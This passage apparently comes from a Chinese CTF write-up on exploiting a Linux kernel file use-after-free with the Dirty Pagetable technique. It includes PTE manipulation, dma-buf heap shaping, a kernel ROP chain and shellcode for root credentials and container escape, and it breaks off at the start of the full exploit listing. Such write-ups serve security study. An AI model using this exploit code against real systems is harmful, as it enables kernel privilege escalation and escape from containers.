class="keyword">if</span>(i == uaf_read_fd)&#123;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    close(read_fd[i]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; WRITE_FD; i++)&#123;</span><br><span class="line">    close(write_fd[i]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下来就能够让 PTE 来占位我们的 file uaf 的堆块</p><img src="/2024/11/12/fileuaf/5.png" class="" title="我的图图呢">  <p>给 PTE 占位后 uaf 块在 gdb 调试的结果如下：</p><img src="/2024/11/12/fileuaf/6.png" class="" title="我的图图呢">  <p>可以发现 PTE 所指向物理地址是以 0x1000 递增的，这正好满足一个页的大小。</p><p>然而由于 file 结构体给释放了，所以我们对该 file 进行其他操作基本都会导致 kernel panic，可是 dup 依然可用。通过看 file 结构体的源码我们可以发现有个叫 f_count 的变量在 file + 0x38 的位置，f_count表示文件对象的引用计数，当我们调用dup系统调用复制文件描述符时它将递增。因此，我们获得一个原语来递增 PTE 中的指针。然而正常情况下一个进程最多可以拥有 0x400 个文件描述符，我们无法 dup 很多次，但是我们可以通过 fork 来实现多次 dup。在这道题目中，我们可以看到在 startjail.sh 中有条命令：ulimit -Hn 33000，这表示我们能够在一个进程中最多拥有 33000 个文件描述符，这大大方便了我们对 file uaf 的利用。</p><p>接下来我们就可以对 uaf_file dup 0x1000 次，这时就会出现物理地址的重叠：</p><img src="/2024/11/12/fileuaf/7.png" class="" title="我的图图呢">  <p>利用 dup 函数令 PTE 的条目递增 0x1000:</p><img src="/2024/11/12/fileuaf/8.png" class="" title="我的图图呢">  <p>最终效果如下：</p><img src="/2024/11/12/fileuaf/9.png" class="" title="我的图图呢">  <p>可以看见两个 PTE 条目指向了同一个物理地址，这个时候我们再使用 munmap 释放掉我们重叠的 PTE 对应的虚拟内存，我们就能够构造出物理内存上的 page uaf。有了page uaf 后我们第一时间可能会想到<font style="color:rgb(77, 77, 77);">用用户页表占据释放页，这样就能控制用户页表，然而这是不太现实的。匿名 mmap() 分配的物理页来自内存区的MIGRATE_MOVABLE free_area，而用户页表是从内存区的 MIGRATE_UNMOVABLE free_area 分配，所以很难通过递增 PTE 使之指向另一用户页表。这里我们采用另外一种方式来分配物理页，使该物理页和用户页表来自同一内存区域，这样如果受害者PTE指向该物理页，就能通过递增该PTE，使该PTE指向某个用户页表。</font></p><p>下面的操作来自 dirty pageTable 的文章<a href="https://yanglingxi1993.github.io/dirty_pagetable/dirty_pagetable.html">Dirty_Pagetable (yanglingxi1993.github.io)</a>：</p><hr><p>作者选用 dma-buf 系统堆来分配共享页，因为可以从 Android 中不受信任的 APP 来访问 &#x2F;dev&#x2F;dma_heap&#x2F;system，并且 dma-buf 的实现相对简单。通过 open(&#x2F;dev&#x2F;dma_heap&#x2F;system) 可获得一个 dma heap fd，然后用以下代码分配一个共享页：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">dma_heap_allocation_data</span> <span class="title">data</span>;</span></span><br><span class="line"></span><br><span class="line">data.len = <span class="number">0x1000</span>;</span><br><span class="line">data.fd_flags = O_RDWR;</span><br><span class="line">data.heap_flags = <span class="number">0</span>;</span><br><span class="line">data.fd = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (ioctl(dma_heap_fd, DMA_HEAP_IOCTL_ALLOC, &amp;data) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    perror(<span class="string">&quot;DMA_HEAP_IOCTL_ALLOC&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> dma_buf_fd = data.fd;</span><br></pre></td></tr></table></figure><p>由用户空间中的 dma_buf_fd 来表示一个共享页，可通过 mmap() dma_buf_fd 将共享页映射到用户空间。从 dma-buf 系统堆分配的共享页本质上是从页分配器分配的（实际上 dma-buf 子系统采用了页面池进行优化，对于本利用没有影响）。用于分配共享页的 gfp_flags 如下所示：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> HIGH_ORDER_GFP  (((GFP_HIGHUSER | __GFP_ZERO | __GFP_NOWARN \ <span class="comment">// HIGH_ORDER_GFP 用于 order-8和order-4 page</span></span></span><br><span class="line">                | __GFP_NORETRY) &amp; ~__GFP_RECLAIM) \</span><br><span class="line">                | __GFP_COMP)</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LOW_ORDER_GFP (GFP_HIGHUSER | __GFP_ZERO | __GFP_COMP) <span class="comment">// LOW_ORDER_GFP 用于 order-0 page</span></span></span><br><span class="line"><span class="type">static</span> <span class="type">gfp_t</span> order_flags[] = &#123;HIGH_ORDER_GFP, HIGH_ORDER_GFP, LOW_ORDER_GFP&#125;;</span><br></pre></td></tr></table></figure><p>共享页分配 vs 页表分配：从 LOW_ORDER_GFP 可以看出，单个共享页是从内存的 MIGRATE_UNMOVABLE free_area 中分配的，和页表分配的出处一样。且单个共享页为 order-1 （order-0 ?），和页表的 order 相同。结论是，单个共享页和页表都是从同一 migrate free_cache 中分配，且 order 相同。</p><img src="/2024/11/12/fileuaf/10.svg" class="" title="我的图图呢">  <p><font style="color:rgb(77, 77, 77);">可见，在物理内存中，单个共享页和用户页表分布得比较紧凑。现在，我们成功对共享页和用户页表进行了 heap shaping。</font></p><hr><p>总的来说我们可以利用 dma-buf 来辅助我们让物理地址 page uaf 的堆块给 DMA-buf heap 给占位，而该 heap 在物理地址上与另外一个 PTE 相邻，此时我们即可再次利用 file uaf 来令 victim PTE 指向 PTE 对应的物理地址，进而能够任意修改 PTE 的条目来实现物理地址上的读写，其布置如下：</p><img src="/2024/11/12/fileuaf/11.png" class="" title="我的图图呢">  <p>利用 file uaf 再次 dup 0x1000 后，修改 PTE 的条目：</p><img src="/2024/11/12/fileuaf/12.png" class="" title="我的图图呢">  <p>接下来我们已经拥有修改 PTE 的能力，那我们肯定要先获取 kernel 代码段的基址才能够对代码段进行写操作，这个地方的操作比较牛逼，这里引用<a href="https://ptr-yudai.hatenablog.com/entry/2023/12/08/093606">Understanding Dirty Pagetable - m0leCon Finals 2023 CTF Writeup - CTFするぞ (hatenablog.com)</a>：</p><hr><p>Although it’s already 2024, we can find some fixed physical addresses on both Linux and Windows.</p><img src="/2024/11/12/fileuaf/13.png" class="" title="我的图图呢">  <p>The pages around here is always fixed, and data for page table is left. (Credit to shift_crops who found it during HITCON.) The page table has a pointer to kernel-land physical address, which is useful for leaking the physical base address of the kernel.</p><hr><p>也就是说我们可以直接在这个固定的物理地址上获取某个内核代码段的地址：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Leak kernel physical base</span></span><br><span class="line"><span class="type">void</span> *wwwbuf = <span class="literal">NULL</span>;</span><br><span class="line">*(<span class="type">size_t</span>*)dmabuf = <span class="number">0x800000000009c067</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; N_PAGESPRAY; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (page_spray[i] == evil) <span class="keyword">continue</span>;</span><br><span class="line">    <span class="keyword">if</span> (*(<span class="type">size_t</span>*)page_spray[i] &gt; <span class="number">0xffff</span>) &#123;</span><br><span class="line">        wwwbuf = page_spray[i];</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[+] Found victim page table: %p\n&quot;</span>, wwwbuf);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+] wwwbuf data: %p \n&quot;</span>, ((*(<span class="type">size_t</span>*)wwwbuf)));</span><br></pre></td></tr></table></figure><p>接下来我们就要找到该地址与内核物理基址的偏移，这里有一个技巧，当我们关闭了 kaslr 时内核的物理基址会固定为 0x1000000，我们可以关闭 kaslr 后再进行对偏移的计算，我们可以在 qemu monitor 中进行验证。</p><img src="/2024/11/12/fileuaf/14.png" class="" title="我的图图呢">  <p>可是开启了 kaslr 后这个偏移会有一点点改变 :( 不过问题不大，在开启 kalsr 时调试改改就行。</p><p>这里其实还可以使用 gef 升级版本来直接进行物理地址和虚拟地址的转换（笔者觉得这个功能真的好牛逼），相关命令为 p2g、g2p  </p><img src="/2024/11/12/fileuaf/16.png" class="" title="我的图图呢">  <p>项目地址为：<a href="https://github.com/bata24/gef">https://github.com/bata24/gef</a>  </p><p>获得内核物理地址基址后就可以直接修改内核的代码段了，我这里选择修改 getuid 函数。</p><p>我们的最终目标是进行容器逃逸，这里参考<a href="https://syst3mfailure.io/corjail/">[corCTF 2022] CoRJail: From Null Byte Overflow To Docker Escape Exploiting poll_list Objects In The Linux Kernel (syst3mfailure.io)</a>上的 rop 链：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">buff = (<span class="type">char</span> *)<span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">1024</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Stack pivot    [1]</span></span><br><span class="line">*(<span class="type">uint64_t</span> *)&amp;buff[<span class="number">0x10</span>] = target_object + <span class="number">0x30</span>;             <span class="comment">// anon_pipe_buf_ops</span></span><br><span class="line">*(<span class="type">uint64_t</span> *)&amp;buff[<span class="number">0x38</span>] = kernel_base + <span class="number">0xffffffff81882840</span>; <span class="comment">// push rsi ; in eax, dx ; jmp qword ptr [rsi + 0x66]</span></span><br><span class="line">*(<span class="type">uint64_t</span> *)&amp;buff[<span class="number">0x66</span>] = kernel_base + <span class="number">0xffffffff810007a9</span>; <span class="comment">// pop rsp ; ret</span></span><br><span class="line">*(<span class="type">uint64_t</span> *)&amp;buff[<span class="number">0x00</span>] = kernel_base + <span class="number">0xffffffff813c6b78</span>; <span class="comment">// add rsp, 0x78 ; ret</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ROP</span></span><br><span class="line">rop = (<span class="type">uint64_t</span> *)&amp;buff[<span class="number">0x80</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// creds = prepare_kernel_cred(0)   [2]</span></span><br><span class="line">*rop ++= kernel_base + <span class="number">0xffffffff81001618</span>; <span class="comment">// pop rdi ; ret</span></span><br><span class="line">*rop ++= <span class="number">0</span>;                                <span class="comment">// 0</span></span><br><span class="line">*rop ++= kernel_base + <span class="number">0xffffffff810ebc90</span>; <span class="comment">// prepare_kernel_cred</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// commit_creds(creds)    [3]</span></span><br><span class="line">*rop ++= kernel_base + <span class="number">0xffffffff8101f5fc</span>; <span class="comment">// pop rcx ; ret</span></span><br><span class="line">*rop ++= <span class="number">0</span>;                                <span class="comment">// 0</span></span><br><span class="line">*rop ++= kernel_base + <span class="number">0xffffffff81a05e4b</span>; <span class="comment">// mov rdi, rax ; rep movsq qword ptr [rdi], qword ptr [rsi] ; ret</span></span><br><span class="line">*rop ++= kernel_base + <span class="number">0xffffffff810eba40</span>; <span class="comment">// commit_creds</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// task = find_task_by_vpid(1)    [4]</span></span><br><span class="line">*rop ++= kernel_base + <span class="number">0xffffffff81001618</span>; <span class="comment">// pop rdi ; ret</span></span><br><span class="line">*rop ++= <span class="number">1</span>;                                <span class="comment">// pid</span></span><br><span class="line">*rop ++= kernel_base + <span class="number">0xffffffff810e4fc0</span>; <span class="comment">// find_task_by_vpid</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// switch_task_namespaces(task, init_nsproxy)    [5]</span></span><br><span class="line">*rop ++= kernel_base + <span class="number">0xffffffff8101f5fc</span>; <span class="comment">// pop rcx ; ret</span></span><br><span class="line">*rop ++= <span class="number">0</span>;                                <span class="comment">// 0</span></span><br><span class="line">*rop ++= kernel_base + <span class="number">0xffffffff81a05e4b</span>; <span class="comment">// mov rdi, rax ; rep movsq qword ptr [rdi], qword ptr [rsi] ; ret</span></span><br><span class="line">*rop ++= kernel_base + <span class="number">0xffffffff8100051c</span>; <span class="comment">// pop rsi ; ret</span></span><br><span class="line">*rop ++= kernel_base + <span class="number">0xffffffff8245a720</span>; <span class="comment">// init_nsproxy;</span></span><br><span class="line">*rop ++= kernel_base + <span class="number">0xffffffff810ea4e0</span>; <span class="comment">// switch_task_namespaces</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// new_fs = copy_fs_struct(init_fs)    [6]</span></span><br><span class="line">*rop ++= kernel_base + <span class="number">0xffffffff81001618</span>; <span class="comment">// pop rdi ; ret</span></span><br><span class="line">*rop ++= kernel_base + <span class="number">0xffffffff82589740</span>; <span class="comment">// init_fs;</span></span><br><span class="line">*rop ++= kernel_base + <span class="number">0xffffffff812e7350</span>; <span class="comment">// copy_fs_struct;</span></span><br><span class="line">*rop ++= kernel_base + <span class="number">0xffffffff810e6cb7</span>; <span class="comment">// push rax ; pop rbx ; ret</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// current = find_task_by_vpid(getpid())    [7]</span></span><br><span class="line">*rop ++= kernel_base + <span class="number">0xffffffff81001618</span>; <span class="comment">// pop rdi ; ret</span></span><br><span class="line">*rop ++= getpid();                         <span class="comment">// pid</span></span><br><span class="line">*rop ++= kernel_base + <span class="number">0xffffffff810e4fc0</span>; <span class="comment">// find_task_by_vpid</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// current-&gt;fs = new_fs    [8]</span></span><br><span class="line">*rop ++= kernel_base + <span class="number">0xffffffff8101f5fc</span>; <span class="comment">// pop rcx ; ret</span></span><br><span class="line">*rop ++= <span class="number">0x6e0</span>;                            <span class="comment">// current-&gt;fs</span></span><br><span class="line">*rop ++= kernel_base + <span class="number">0xffffffff8102396f</span>; <span class="comment">// add rax, rcx ; ret</span></span><br><span class="line">*rop ++= kernel_base + <span class="number">0xffffffff817e1d6d</span>; <span class="comment">// mov qword ptr [rax], rbx ; pop rbx ; ret</span></span><br><span class="line">*rop ++= <span class="number">0</span>;                                <span class="comment">// rbx</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// kpti trampoline    [9]</span></span><br><span class="line">*rop ++= kernel_base + <span class="number">0xffffffff81c00ef0</span> + <span class="number">22</span>; <span class="comment">// swapgs_restore_regs_and_return_to_usermode + 22</span></span><br><span class="line">*rop ++= <span class="number">0</span>;</span><br><span class="line">*rop ++= <span class="number">0</span>;</span><br><span class="line">*rop ++= (<span class="type">uint64_t</span>)&amp;win;</span><br><span class="line">*rop ++= usr_cs;</span><br><span class="line">*rop ++= usr_rflags;</span><br><span class="line">*rop ++= (<span class="type">uint64_t</span>)(<span class="built_in">stack</span> + <span class="number">0x5000</span>);</span><br><span class="line">*rop ++= usr_ss;</span><br></pre></td></tr></table></figure><p>其对应的 shellcode 如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">  init_cred         = 0x2a76b00</span><br><span class="line">  commit_creds      = 0x1c2670</span><br><span class="line">  find_task_by_vpid = 0x1b8fa0 </span><br><span class="line">  init_nsproxy      = 0x2a768c0</span><br><span class="line">  switch_task_namespaces = 0x1c0ad0</span><br><span class="line">  init_fs                = 0x2bb5320</span><br><span class="line">  copy_fs_struct         = 0x45c0f0</span><br><span class="line">  kpti_bypass            = 0x14011c6</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line">  endbr64</span><br><span class="line">  call a</span><br><span class="line">a:</span><br><span class="line">  lea r15,[rip]</span><br><span class="line">  sub r15, 0x1ab7f0</span><br><span class="line"></span><br><span class="line">  ; commit_creds(init_cred) [3]</span><br><span class="line">  lea rdi, [r15 + init_cred]</span><br><span class="line">  lea rax, [r15 + commit_creds]</span><br><span class="line">  call rax</span><br><span class="line"></span><br><span class="line">  ; task = find_task_by_vpid(1) [4]</span><br><span class="line">  mov edi, 1</span><br><span class="line">  lea rax, [r15 + find_task_by_vpid]</span><br><span class="line">  call rax</span><br><span class="line"></span><br><span class="line">  ; switch_task_namespaces(task, init_nsproxy) [5]</span><br><span class="line">  mov rdi, rax</span><br><span class="line">  lea rsi, [r15 + init_nsproxy]</span><br><span class="line">  lea rax, [r15 + switch_task_namespaces]</span><br><span class="line">  call rax</span><br><span class="line"></span><br><span class="line">  ; new_fs = copy_fs_struct(init_fs) [6]</span><br><span class="line">  lea rdi, [r15 + init_fs]</span><br><span class="line">  lea rax, [r15 + copy_fs_struct]</span><br><span class="line">  call rax</span><br><span class="line">  mov rbx, rax</span><br><span class="line"></span><br><span class="line">  ; current = find_task_by_vpid(getpid())</span><br><span class="line">  mov rdi, 0x1111111111111111  </span><br><span class="line">  lea rax, [r15 + find_task_by_vpid]</span><br><span class="line">  call rax</span><br><span class="line"></span><br><span class="line">  ; current-&gt;fs = new_fs [8]</span><br><span class="line">  mov [rax + 0x828], rbx</span><br><span class="line"></span><br><span class="line">  ; kpti trampoline [9]</span><br><span class="line">  xor eax, eax</span><br><span class="line">  mov [rsp+0x00], rax</span><br><span class="line">  mov [rsp+0x08], rax</span><br><span class="line">  mov rax, 0x2222222222222222   ; win</span><br><span class="line">  mov [rsp+0x10], rax</span><br><span class="line">  mov rax, 0x3333333333333333   ; cs</span><br><span class="line">  mov [rsp+0x18], rax</span><br><span class="line">  mov rax, 0x4444444444444444   ; rflags</span><br><span class="line">  mov [rsp+0x20], rax</span><br><span class="line">  mov rax, 0x5555555555555555   ; stack</span><br><span class="line">  mov [rsp+0x28], rax</span><br><span class="line">  mov rax, 0x6666666666666666   ; ss</span><br><span class="line">  mov [rsp+0x30], rax</span><br><span class="line">  lea rax, [r15 + kpti_bypass]</span><br><span class="line">  jmp rax</span><br><span class="line"></span><br><span class="line">  int3</span><br></pre></td></tr></table></figure><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span 